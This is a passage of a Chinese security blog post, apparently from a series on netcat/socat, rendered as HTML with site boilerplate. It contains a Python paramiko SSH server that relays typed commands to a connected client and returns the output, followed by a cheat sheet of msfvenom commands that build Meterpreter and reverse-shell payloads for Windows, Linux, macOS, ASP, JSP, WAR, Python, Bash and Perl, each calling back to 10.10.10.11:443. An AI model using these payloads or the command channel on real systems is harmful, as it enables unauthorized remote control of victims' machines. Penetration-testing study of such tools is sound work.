+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import paramiko</span><br><span class="line">import threading</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">from paramiko import server</span><br><span class="line">from paramiko import common</span><br><span class="line"></span><br><span class="line">host_key &#x3D; paramiko.RSAKey(filename&#x3D;&#39;test_rsa&#39;)</span><br><span class="line"></span><br><span class="line">class Server(paramiko.ServerInterface):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.event &#x3D; threading.Event()</span><br><span class="line">    def check_channel_reequest(self,kind,chanid):</span><br><span class="line">        if kind &#x3D;&#x3D; &#39;session&#39;:</span><br><span class="line">            return paramiko.OPEN_SUCCEEDED</span><br><span class="line">        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span><br><span class="line">    def check_auth_password(self,username,password):</span><br><span class="line">        if (username &#x3D;&#x3D; &#39;scott&#39;) and (password &#x3D;&#x3D; &#39;1989&#39;):</span><br><span class="line">            return paramiko.AUTH_SUCCESSFUL</span><br><span class="line">        return paramiko.AUTH_FAILED</span><br><span class="line"></span><br><span class="line">server &#x3D; sys.argv[1]</span><br><span class="line">ssh_port &#x3D; int(sys.argv[2])</span><br><span class="line">try:</span><br><span class="line">    sock &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)</span><br><span class="line">    sock.bind((server,ssh_port))</span><br><span class="line">    sock.listen(100)</span><br><span class="line">    print(&quot;[+] 正在等待连接.....&quot;)</span><br><span class="line">    client,addr &#x3D; sock.accept()</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;[-] error! &quot; + str(e))</span><br><span class="line">    sys.exit(1)</span><br><span class="line">print(&quot;[+] 发现一个连接请求！&quot;)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    bhSession &#x3D; paramiko.Transport(client)</span><br><span class="line">    bhSession.add_server_key(host_key)</span><br><span class="line">    server &#x3D; Server()</span><br><span class="line">    try:</span><br><span class="line">        bhSession.start_server(server&#x3D;server)</span><br><span class="line">    except paramiko.SSHException as x:</span><br><span class="line">        print(&#39;[-] SSH negotiation failed!&#39;)</span><br><span class="line">    chan &#x3D; bhSession.accept(20)</span><br><span class="line">    print(&quot;[+] Authenticated!&quot;)</span><br><span class="line">    print(chan.recv(1024))</span><br><span class="line">    chan.send(&quot;welcome to ssh!&quot;)</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            command &#x3D; input(&quot;Rnter command:&quot;).strip(&quot;\n&quot;)</span><br><span class="line">            if command !&#x3D; &#39;exit&#39;:</span><br><span class="line">                chan.send(command)</span><br><span class="line">                print(str(chan.recv(1024))+&#39;\n&#39;)</span><br><span class="line">            else:</span><br><span class="line">                chan.send(&#39;exit&#39;)</span><br><span class="line">                print(&quot;exiting&quot;)</span><br><span class="line">                bhSession.close()</span><br><span class="line">                raise Exception(&#39;exit&#39;)</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            bhSession.close()</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&#39;[-] Caught exception:&#39; + str(e))</span><br><span class="line">    try:</span><br><span class="line">        bhSession.close()</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    sys.exit(1)</span><br></pre></td></tr></table></figure>
+
+<p>python3 ssh_server.py localhost 8001</p>
+<p>首先是接受客户端请求的方法，会返回一个同意开启会话的方法，和一个用于验证用户名的账号和密码。然后在下面的代码中，尝试开始一个socket用来监听端口，如果收到了接受请求，那么接着往下走，我们会使用上面创建的客户端函数开启一个ssh管道并配置认证模式，当一个客户端认证成功并发回消息，然后就是循环接受用户在服务端输入的命令并发送个客户端，并将客户端命令执行结果返回给我们，知道用户输入exit，代表用户想要退出。</p>
+<h2 id="七、-Meterpreter反弹shell"><a href="#七、-Meterpreter反弹shell" class="headerlink" title="七、 Meterpreter反弹shell"></a>七、 Meterpreter反弹shell</h2><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</p>
+<p>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</p>
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</p>
+<p>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</p>
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=”10.10.10.11” LPORT=443 -f elf &gt; shell.elf</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=”10.10.10.11” LPORT=443 -f exe &gt; shell.exe</p>
+<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=”10.10.10.11” LPORT=443 -f macho &gt; shell.macho</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=”10.10.10.11” LPORT=443 -f asp &gt; shell.asp</p>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=”10.10.10.11” LPORT=443 -f raw &gt; shell.jsp</p>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=”10.10.10.11” LPORT=443 -f war &gt; shell.war</p>
+<p>msfvenom -p cmd/unix/reverse_python LHOST=”10.10.10.11” LPORT=443 -f raw &gt; shell.py</p>
+<p>msfvenom -p cmd/unix/reverse_bash LHOST=”10.10.10.11” LPORT=443 -f raw &gt; shell.sh</p>
+<p>msfvenom -p cmd/unix/reverse_perl LHOST=”10.10.10.11” LPORT=443 -f raw &gt; shell.pl</p>
+
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2022/77ncsocat/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+              #网络安全
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2022/76Nbtscan/" target="_self">76Nbtscan</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2022/78Octopus/" target="_self">78Octopus</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
